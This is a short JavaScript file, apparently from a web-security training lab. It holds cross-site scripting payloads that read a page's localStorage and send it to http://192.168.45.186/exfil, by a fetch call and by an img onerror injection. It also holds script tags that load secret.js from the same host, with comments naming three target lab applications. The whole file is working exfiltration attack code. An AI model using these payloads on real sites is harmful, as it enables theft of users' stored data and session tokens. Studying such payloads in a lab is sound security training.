let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.186/exfil?data=" + encodedData)


// 1. Steal the local storage contents using the "Data in Local Storage" setting from the Donate application using the techniques taught here.
//<script src="http://192.168.45.186/secret.js"></script>

// 2. Steal the local storage contents using the "Data in Local Storage" setting from the RSVP application using the techniques taught here.
//<script src="http://192.168.45.186/secret.js"></script>

// 3. Steal the local storage contents using the "Data in Local Storage" setting from the List application using the techniques taught here.
//<img src='x' onerror='fetch("http://192.168.45.186/exfil?data=" + encodeURIComponent(JSON.stringify(localStorage)));'>